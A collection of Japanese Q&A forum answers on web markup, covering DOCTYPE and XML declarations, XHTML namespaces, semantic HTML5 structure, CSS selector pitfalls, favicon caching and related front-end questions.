文書は見分けがつかない場合がありますので、冒頭に「これは XML だぞ」という宣言を書いておきます。 <?xml version="1.0" encoding="UTF-8"?> これは、カタチとしては処理命令になっており SGML 宣言など面倒くさいものを省略する云々、XML は意識的に Unicode を取り込んだ規格で文書の保存性を高めるために文字コード宣言が云々。 小難しいことはともかく、XML/XHTML 文書を書くなら XML 宣言を書いて下さい。たかだかブラウザの都合で XML 宣言を書いたり書かなかったりなんて情けないことを言わず、どーんと構えていれば良いのです。 --- とはいえ、ブラウザの都合に左右されるのも人情です。どうしても気になる方々は HTML5 を使えば良いでしょう。 HTML5 というと、巷では「新機能！」と喝采を浴びていますが、そんなのはどうでもよろしい。大事なのは、「このように書けば、ブラウザがこう解釈するから、よろしく」と、HTML の書き方とブラウザの振る舞いを結び付けたことです。 HTML5 の DOCTYPE 宣言は <!DOCTYPE html>、ただこれだけです。これはどういう意味か？ 何の意味もありません。 何の意味もないものを、なぜ書くのか。歴史的な理由で、DOCTYPE 宣言の有無でブラウザが「描画モード」を切り替えるという、面倒くさい話があるからです（DOCTYPE スイッチと呼ばれます）。本来なくなるべき DOCTYPE 宣言が、ブラウザの振る舞い上、なくせないものになってしまいました。 HTML5 はそういう事情を考慮し、DOCTYPE 宣言を残すにしても、せめて簡単な形にしようとしました。それが <!DOCTYPE html> です。これがあれば、DOCTYPE スイッチの元祖である IE6 でも「標準モード」になります。 本来の意味をなくしたものが、形骸化して残る。HTML の「進化」とはよく言ったものです。 --- 長々と書きましたが、結論としては、DOCTYPE 宣言の意味がよく分からなければ <!DOCTYPE html> だけ書けば良い、ということです。それ以上のことは、必要になってから覚えれば十分です。
えーっと，XHTML 1.0 Transitionalの文書型宣言は <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitio … となります。 で，公開識別子"-//W3C//DTD XHTML 1.0 Transitional//EN"のENは，この文書型が英語で書かれていることを意味します。 公開識別子の次のシステム識別子"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitio …が，DTDの場所になります。 # SGMLでは省略可能だったけれど，XMLでは省略不可。 ref) 文書型宣言の読み方 | 鳩丸よもやま話 http://bakera.jp/yomoyama/doctype http://www.w3.org/1999/xhtmlはXHTMLの名前空間ではないかと思います。 つまり， <?xml version="1.0" ?> <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitio … <html xmlns="http://www.w3.org/1999/xhtml" lang="ja" xml:lang="ja"> のように書きます。 XML名前空間は，複数のXMLのスキーマを混ぜるための機構です。 これを使うことで，XHTMLとMathMLとSVGを混ぜる，などした時に，同じ名前のタグを別々のタグとして認識させることができます。 ref) Namespaces in XML 1.0 (Third Edition) http://www.w3.org/TR/xml-names/ # XML名前空間はXMLに対して後付けなので，XML仕様書には直接書かれていなかったりします。
＞万人が同じように見れてこそ、真のHTML/CSSというもの。 　違いますよ。HTMLは「万人が同じように情報を共有できる」ためのもです。 　「万人が同じように見」えるためには、PDF( http://ja.wikipedia.org/wiki/PDF )のように選りすぐれた仕様があります。 　　　・・・ただし、正確には「万人が同じように【印刷して】見れる」ですが・・・ 　そもそも、読み上げソフトや携帯端末、検索エンジンはどうすればよいのでしょう。 　したがって、「ハックすら考えなくてよい」のです。・・これすら邪道かもしれません。 HTML ↑　ネットワークで繫がっているすべての端末が情報を共有するために考え出されて ｜　その有益性が認められてここまで発展してきた。 ↓ PDF 　　OSやブラウザ、フォントに依存せず、デザインしたものがまったく同じに利用でき 　るための仕様 　たとえばウェブ標準のHTML5で記述すると <body> 　<header> 　　見出しやこのページの目次、要約 　</header> 　<section> 　　<hn>章見出し</hn> 　　記事 　　　<section> 　　　　<hn>項見出し</hn> 　　　　記事 　　　</section> 　</section> 　<footer> 　　文書の情報 　</footer> </body> 　HTML4.01(XHTML1.0,XHTML1.1は基本的に同じ)は、<div class="header">とかになる。 ・・・・DIVはIDやクラス名で構造を示す・・・ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　この様に書かれていると、「すべての端末で情報を共有できますね」検索エンジンもどこがヘッダで、どこが本文か理解できる。 　HTMLには、ワープロやDTP( http://ja.wikipedia.org/wiki/DTP )とは本質的に目的が違いますから、当然デザインについては制約があります。というか、そもそもデザインのためじゃない--そのためにCSSが用意されていますが完璧じゃない---。 　同じように見せたい「ページ作りは「HTMLを使いながら、HTMLの目的を否定する」矛盾したことなのです。 　気持ちは、とて見よくわかります。しかし、14.1 スタイルシートの概説 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) も一度読んでみて下さい。 「角をためて牛を殺す」にならないよう。 　そうすると、今まで苦労して悩んだことは何だったのだろう・・と思います。私もそれを経験しています。はっきり言ってショックでした。 　
　javascriptの onMousOver onClick 関数を使いますが、スタイルシートが使えなければ、もっと制約が多いはず。 「オンスクリーン、オフスクリーンのタグ文で簡単に出来る」は意味不明です。タグ文という言葉もありません。もちろんオンスクリーン、オフスクリーンは、ウェブには関係ない用語です。知ったかぶりを言っただけじゃないの？
ここで聞くよりマニュアルを読むべきです。 解決策は 「PC用説明文欄に認められていないHTMLタグ、または「<」「>」が入力されてい」ないか確認して、「各入力項目ごとの利用可能なHTMLタグ」を使っていないか「ご確認ください。」しか解決策はありません。 　まずそこからはじめましょう。
まずはANo.1さんも言っているとおりHTMLが間違っています。 HTMLについてもう少し勉強をしましょう。 で、質問にある ＞ほんの少しだけ隙間が残ってしまいます。 についてなんですけど 解決方法はtableタグにcellpadding="0"を付け加えると隙間がなくなります <table class="menu" cellspacing="0" cellpadding="0"> こんな感じに tableタグを使う時はcellspacing="0" cellpadding="0" border="0"を入れると良いかも。 ここからちょっとだけアドバイスなんですけど サンプルソースのものを作るのにtableタグは使わないほうがいいです。 というか、tableタグを使う時は表を作る時に使うのがいいかと。 そして、menuのところの <div><a href="link.html">Test</a></div> ですが ANo.1さんのところにもあるul,liタグを使うのが良いです。 <ul> <li><a href="#">test</a></li> <li><a href="#">test</a></li> <li><a href="#">test</a></li> </ul> これだけじゃ横並びにならないので CSSで ul{ list-style:none; } ↑点をなくす li{ display:inline; } ↑横並びにする と横並びになります あとのmargin,paddingはご自分で指定してください。
まず最初に一言、言わせて下さい。 検証にすんごい時間かかりました！もうイヤ！ 取り乱しました。申し訳ありません…。 というのも、すごい初歩的なミスなんですよ。 一回ミスった事がある人か、 ＣＳＳの仕様をちゃんと読んでる人しかわからないくらいの。 私の場合、ミスったこともないし仕様も読んでませんから…！ なんと、クラス名って、数字で始められないんですって。 （私もCSSを扱って長いですが、初めて知りました） たったそれだけです。びっくり！ でも、製作環境がdreamweaverならハマるかもです。 頭文字が数字でも、dreamweaverのプレビュー画面が変な気をまわしてですね、 marginだのheightだのwidthはプレビュー上で反映しちゃうんですよ。 背景については、反映したりしなかったり不安定な挙動でした。 でも、そもそも数字から始まるクラス名はCSSのサポ外なので、 実際にブラウザで確認しても背景は表示できないわけです。 私はdreamweaverで製作しているので、まんまとハマりました。 あれ、プレビューではイケそうなのに、ブラウザにでないぞ…！と。 いやぁ…疲れました。 あと、CSS内でIDの中にクラスを記述するのはやめたほうがいいですよ。 #sideArea .6supportっていう記述のことです。 そこ、.6supportってだけでいけますし、#sideAreaを頭につけた分無駄かと。 ブラウザによっては変な挙動をしたはずです。昔ハマッた気がします。 IDとクラスは明確に分けて扱うほうがCSSルール上好ましいと思います。 #sideArea .6support ではなく、 #sideArea .tdとか#sideArea .ｐのようなＨＴＭＬタグへの一括指定ならば、 ＣＳＳでも推奨している使いかたになるのですが。
No.2 の補足より。 > tx.executeSql("insert into storage (key1, val, val2) values (?, ?, ?)", [key1, value, value2], function() { そして、No.0 より。 > list.options[list.options.length] = new Option(row.val2, row.val, row.key1); であれば、 > tx.executeSql("select * from storage where key1 = ?", [selected], function(tx, rs) { ではなく、 tx.executeSql("select * from storage where val = ?", [selected], function(tx, rs) { です。この selected は row.val の値ですから。 それと、new Option(text/*文字列*/, value/*文字列*/, defaultSelected/*真偽値*/, selected/*真偽値*/) ですから、option 要素の生成時に row.key1 は反映されません（真偽値に型変換されます）。これが意図したものか分かりませんが、もしミスであるならば、慣れないうちは古い Option コンストラクタを使わず、createElement('option') から一歩ずつ確実に要素を作って下さい。
ファビコンを変更/削除しておいて、 しばらくの期間待つしかない。何度かアクセスしていれば消えるかも。 ブラウザキャッシュで画像を記録/記憶していて、 （貴方が人の顔や名前を記憶するのと同じ、その内忘れるでしょ？） その古い画像を表示してしまいます。 特にファビコンはブックマーク表示もあるので、 アクセスしなくてもしばらく残るようになっています。 ブラウザによて違うようですし、挙動も不安定です。 ウチのブックマーク欄でも しばらくアクセスしていないURLのファビコンはその内消えるみたいですよ。 半年とか数カ月程度だろうか？ 早く新しいアイコンを作るか、透過画像でも仮設置しておきましょう。
<body> ・・・ <table><tr> <td><img src="img1"></td> <td><p>説明文</p></td> </tr></table> ・・・ </body> 　このtable部分が実質の表であるか否かですね。表(縦・横のいずれか、または両方に項目があるもの)ではなく、リストでしたらHTMLは、 <ol> 　<li><img src="[URL]" width="[サイズ]" height="[サイズ]" alt="[画像の代わりになる文字列]"> 　　　<ul> 　　　　<li>説明</li> 　　　　<li>説明</li> 　</li> 　<li><img src="[URL]" width="[サイズ]" height="[サイズ]" alt="[画像の代わりになる文字列]"> 　　　<ul> 　　　　<li>説明</li> 　　　　<li>説明</li> 　</li> </ol> 　のほうが良いでしょうね。 　その上で、スタイルシートで左右に並ぶように配置すればよい。原稿は普通にメモ帳で書いてもらえばよいです。
一応、ID の文脈を指定することはありますよ。例えば、一時期わずかに流行った手法として、html 要素にページごとの ID を埋め込む、というのがありました。 <html id="C58F5A72-CB88-429D-95BC-8E6FD8341159"> 　.... 　<div class="section div1" id="section1-1"> 　　.... 　</div> 　.... </html> /* このページの #section1-1 にだけ適用 */ *:root#C58F5A72-CB88-429D-95BC-8E6FD8341159 *#section1-1 { 　.... } 本来、ページは ID すなわち URI を持っていますが、CSS でページの URI を調べる標準的な手段がありません（Mozilla/Firefox には @-moz-document などがありますが）。そこでやむをえず上記のような一種のハックを用いました。 まあ、詳細度を上げてしまうため、どちらかと言えば利用者スタイル向けですが。 --- また、アクセシブルな Web アプリのフレームワークである WAI ARIA には、次のような手法があります。 <ul role="tree" aria-activedescendant="treeitem-focused"> 　<li role="treeitem" tabindex="0" id="treeitem-focused">りんご</li> 　<li role="treeitem" tabindex="-1" >みかん</li> 　<li role="treeitem" tabindex="-1" >ばなな</li> </ul> @aria-activedescendant は、フォーカスの当たっている要素の ID を記録します。しかし、個々のツリー項目にいちいち ID を振るのも面倒です。そこで逆転の発想、「フォーカスの当たっている要素に id="tree-focused" を与える」ことにします。 <ul role="tree" aria-activedescendant="treeitem-focused"> 　<li role="treeitem" tabindex="-1">りんご</li> 　<li role="treeitem" tabindex="0" id="treeitem-focused">みかん</li> 　<li role="treeitem" tabindex="-1" >ばなな</li> </ul> このように「@id を目印として移動させる」という手法では、@id がツリーの中にないと困ります。 *[role~="tree"] *[role~="treeitem"]#treeitem-focused { 　.... } まあ、こちらはスクリプトがないとできませんけどね。
静的サイトでしょうけど、 新規で構築するとか、システム云々の話が別方向なので・・・ 違うような気がします。 また、HTML,CSSで作るならフレームしかないですけど、それもお勧めできない。 ----------------------------------- あくまで、目的が更新の手間と言う事で、新規構築せずに、 現状のウェブサイトのナビメニューの変更/更新を簡単にしたいだけなら、 置換機能のある高機能エディタで一発置換えしましょう。 無料のエディタでも探せばあると思いますし、 Adobe Dreamweaverなら１分も掛からず変更出来るでしょう。 無料のお試しで使ってみましょう。 サイト単位、フォルダ単位、ページ単位、選択範囲単位で一発置換えが可能です。 正規表現での置換えや、文字検索・ソース検索も出来るので、 かなり便利ですよ。というより時間の節約や作業の軽減になります。
http://dw230.net/rank/ こんなようなサイトでURL検索してみれば、未登録とか出るでしょう。 ＞よくgoogleとかyahooの検索エンジンに検索されやすくするためにサイトを登録したりしますよね しません。 Googleウェブマスターツールで管理する方が良いです。 Yahoo検索 = Googleエンジンです。 Googleにインデックスされれば、Yahooで検索できます。 99％のサイトがインデックスされるでしょう。順位は内容次第。 検索されるのと、ヤフカテは別の話です。 商用は有料です。 http://business.yahoo.co.jp/bizx/
スタイルシート一文字抜けてました。 ul#navi,ul#nav li{ list-style:none;/* IEバグ対策(displayを指定してもマーカーが残る */ display:block;margin:0;padding:0; } ul#navi{width:150px;} ul#navi li { /* navと指定していました */ width:70px; float:left; line-height:30px; height:30px; border-left:1px solid #000; } 　たまたま画面ではfloatが解除されたのは、親コンテナブロックの幅が150pxだったからです。その証拠に、 #navi li:nth-child(3) { clear:both; border-left:none; } がなくても、下の段に移動します。 印刷スタイルシートでは、pxの値はしばしばトラブルの原因となります。CSS2.1で変更になりました。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Note that if the anchor unit is the pixel unit, the physical units might not match their physical measurements. Alternatively if the anchor unit is a physical unit, the pixel unit might not map to a whole number of device pixels. Note that this definition of the pixel unit and the physical units differs from previous versions of CSS. In particular, in previous versions of CSS the pixel unit and the physical units were not related by a fixed ratio: the physical units were always tied to their physical measurements while the pixel unit would vary to most closely match the reference pixel. (This change was made because too much existing content relies on the assumption of 96dpi, and breaking that assumption breaks the content.) ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Syntax and basic data types( http://www.w3.org/TR/CSS2/syndata.html#length-un … )］より 　印刷用の場合は、cmやmmもしくは、ptやpcで指定するほうが確実です。 　なお、floatにいったん指定した要素にclearを指定しても本来は利きません。有効なブラウザもあります。 nth-child(n)はCSS3のセレクタです。いくつかの数で折り返したいときは、nth-child(2n)とかnth-child(3n)ですかね。 　CSS2.1で書けば #navi li+li{} #navi li+li+li{} #navi li+li+li+li{} と隣接セレクタを使う。 　それでもIE5など古いブラウザには無効なので、コンテナブロックの幅をfloatさせる要素の２個以上３個未満の幅に指定するほうが楽です。単位は絶対単位で!! 　 　
説明すると長くなるので 文書型宣言について ( http://members.jcom.home.ne.jp/pctips/www/DOCTYP … ) 各HTMLバージョンのDOCTYPE宣言のサンプル集 ( http://www.animegif.net/tips/html/doctype-html-p … ) を読んでください。 ブラウザ対象に使い分けが必要なときは DOCTYPEスイッチ - W3G Web用語集 ( http://w3g.jp/others/data/doctype_switching )
CSSがめちゃくちゃなせいですね float・positionが絡み合っててこれではブラウザによって認識間違えが起こるのが当然な気がします 部分修正で直せる問題ではありません またdiv要素にidとclass属性両方を設定していたり、class属性にスペースを使っているのも問題 class名内のスペースは、ブラウザによってはスペースの前後で別のclass名と認識されます http://www.webdlab.com/template/layout_h2/ まずこの辺を参考にHTML5の基本的なレイアウトを組む そのあとでニュースエリアなどを埋め込む そういう手順で作り直す必要があるかと思います
HTMLカテゴリにたてたということはHTMLで解決したいってことなのかな？ HTML5 では <input type="number" min="10" max="80"> で実現可能です。 http://jsfiddle.net/TDFK4/
